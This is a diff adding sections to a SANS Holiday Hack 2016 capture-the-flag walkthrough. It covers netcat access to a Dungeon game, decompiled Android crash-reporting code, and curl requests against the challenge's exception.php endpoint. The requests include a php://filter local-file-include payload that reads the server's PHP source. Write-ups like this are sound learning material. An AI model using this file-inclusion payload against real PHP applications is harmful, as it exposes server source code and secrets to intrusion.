@@ -530,6 +530,8 @@ Go back to the center of the room and talk to Pepper Minstix.
 
 He will provide with links to [Meteor](https://www.meteor.com/), [SANS training on hacking Meteor](https://pen-testing.sans.org/blog/2016/12/06/mining-meteor), [a tool called MetorMiner](https://github.com/nidem/MeteorMiner) and to [TamperMonkey](https://tampermonkey.net/).
 
+Also, you get a link to a [dungeon.zip](http://www.northpolewonderland.com/dungeon.zip) file.
+
 Enter the room on the right.
 
 ![Shinny Upatree](screens/shinny-upatree-1.png)
@@ -1061,7 +1063,9 @@ curl -H "Content-Type: application/json" 'http://dev.northpolewonderland.com/ind
 {"date":"20170105205633","status":"OK","filename":"debug-20170105205633-0.txt","request":{"date":"2","udid":"2","debug":"com.northpolewonderland.santagram.EditProfile, EditProfile","freemem":1,"verbose":false}}%
 ```
 
-Note that there is an additional parameter in the response `"verbose":false`. We can set this to `true` in our request. In my case, the response was pretty big. Examining the first lines, I noticed that it seems to include a list of debug files stored on the server. Including an `mp3`file `debug-20161224235959-0.mp3`. We can download the file with `wget http://dev.northpolewonderland.com/debug-20161224235959-0.mp3`. I was not sure what number it should get, though. Will deal with this later.
+Note that there is an additional parameter in the response `"verbose":false`. We can set this to `true` in our request. In my case, the response was pretty big. Examining the first lines, I noticed that it seems to include a list of debug files stored on the server. Including an `mp3`file `debug-20161224235959-0.mp3`. We can download the file with `wget http://dev.northpolewonderland.com/debug-20161224235959-0.mp3`.
+
+Looking at the metadata (on Mac, just right click on the file, then `Get Info`), this is title 4. The numbers from the other files match (e.g. `discombobulatedaudio1` is title 1). So I renamed the file to `discombobulatedaudio4.mp3`.
 
 > dungeon.northpolewonderland.com 35.184.47.139
 
@@ -1089,6 +1093,27 @@ PORT      STATE    SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 14.43 seconds
 ```
 
+We got the `dungeon.zip` earlier from Pepper Minstix.
+
+### Port 80
+
+I first had a look at the webserver. It simply is a static page about how to play the dungeon game.
+
+### Port 11111
+
+Next interesting thing was port 11111. Turns out that we can play the game remotely via this port.
+
+```
+$ nc  dungeon.northpolewonderland.com 11111
+Welcome to Dungeon.			This version created 11-MAR-78.
+You are in an open field west of a big white house with a boarded
+front door.
+There is a small wrapped mailbox here.
+```
+
+I did not manage to complete the game. I had a peak at a write up and learned that when completing the game, you need to send an email to `peppermint@northpolewonderland.com`. She replies to you with the file `discombobulatedaudio3.mp3`.
+
+
 > ex.northpolewonderland.com 104.154.196.33
 
 ```
@@ -1109,6 +1134,94 @@ PORT   STATE SERVICE
 |_http-title: 403 Forbidden
 
 Nmap done: 1 IP address (1 host up) scanned in 14.09 seconds
+```
+
+Again, I used `jadx` to search the decompiled Android app for the URL in question. It was found in the class `com.northpolewonderland.santagram.SplashScreen`.
+
+```java
+private void postExceptionData(Throwable th) {
+		final JSONObject jSONObject = new JSONObject();
+		Log.i(getString(R.string.TAG), "Exception: sending exception data to " + getString(R.string.exhandler_url));
+		try {
+				jSONObject.put("operation", "WriteCrashDump");
+				JSONObject jSONObject2 = new JSONObject();
+				jSONObject2.put("message", th.getMessage());
+				jSONObject2.put("lmessage", th.getLocalizedMessage());
+				jSONObject2.put("strace", Log.getStackTraceString(th));
+				jSONObject2.put("model", Build.MODEL);
+				jSONObject2.put("sdkint", String.valueOf(VERSION.SDK_INT));
+				jSONObject2.put("device", Build.DEVICE);
+				jSONObject2.put("product", Build.PRODUCT);
+				jSONObject2.put("lversion", System.getProperty("os.version"));
+				jSONObject2.put("vmheapsz", String.valueOf(Runtime.getRuntime().totalMemory()));
+				jSONObject2.put("vmallocmem", String.valueOf(Runtime.getRuntime().totalMemory() - Runtime.getRuntime().freeMemory()));
+				jSONObject2.put("vmheapszlimit", String.valueOf(Runtime.getRuntime().maxMemory()));
+				jSONObject2.put("natallocmem", String.valueOf(Debug.getNativeHeapAllocatedSize()));
+				jSONObject2.put("cpuusage", String.valueOf(cpuUsage()));
+				jSONObject2.put("totalstor", String.valueOf(totalStorage()));
+				jSONObject2.put("freestor", String.valueOf(freeStorage()));
+				jSONObject2.put("busystor", String.valueOf(busyStorage()));
+				jSONObject2.put("udid", Secure.getString(getContentResolver(), "android_id"));
+				jSONObject.put("data", jSONObject2);
+				new Thread(new Runnable(this) {
+						final /* synthetic */ SplashScreen b;
+
+						public void run() {
+								b.a(this.b.getString(R.string.exhandler_url), jSONObject);
+						}
+				}).start();
+		} catch (JSONException e) {
+				Log.e(TAG, "Error posting message to " + getString(R.string.exhandler_url) + " -- " + e.getMessage());
+		}
+}
+```
+
+With this knowledge, we can again use cURL and build us some JSON objects.
+
+```
+curl -X POST -H "Content-Type: application/json" http://ex.northpolewonderland.com/exception.php -d '{"operation":"WriteCrashDump","data":"abc"}'
+{
+	"success" : true,
+	"folder" : "docs",
+	"crashdump" : "crashdump-eyuCQk.php"
+}
+```
+
+While playing around, I noticed that there is a second RPC supported.
+
+```
+curl -X POST -H "Content-Type: application/json" http://ex.northpolewonderland.com/exception.php -d '{}'
+Fatal error! JSON key 'operation' must be set to WriteCrashDump or ReadCrashDump.
+```
+
+We can use the `ReadCrashDump` call to read our previously created dump.
+
+```
+curl -X POST -H "Content-Type: application/json" http://ex.northpolewonderland.com/exception.php -d '{"operation":"ReadCrashDump","data":{"crashdump":"crashdump-eyuCQk"}}'
+"abc"%
+```
+
+Then I was pretty much stuck. I had to read up on a write-up to get the hint for a [blog post](https://pen-testing.sans.org/blog/2016/12/07/getting-moar-value-out-of-php-local-file-include-vulnerabilities) which was mentioned previously in the game.
+
+With this knowledge about the `php://` wrapper, I was able to read the source code of the exception class.
+
+```
+curl -X POST -H "Content-Type: application/json" http://ex.northpolewonderland.com/exception.php -d '{"operation":"ReadCrashDump","data":{"crashdump":"php://filter/convert.base64-encode/resource=exception"}}'
+```
+
+Right at the top of the file, we find the hint to the next `mp3` file.
+
+```php
+<?php
+
+# Audio file from Discombobulator in webroot: discombobulated-audio-6-XyzE3N9YqKNH.mp3
+```
+
+Let's get it.
+
+```
+wget http://ex.northpolewonderland.com/discombobulated-audio-6-XyzE3N9YqKNH.mp3
+mv discombobulated-audio-6-XyzE3N9YqKNH.mp3 discombobulated6.mp3
 ```
 
 ## Part 1: A Most Curious Business Card
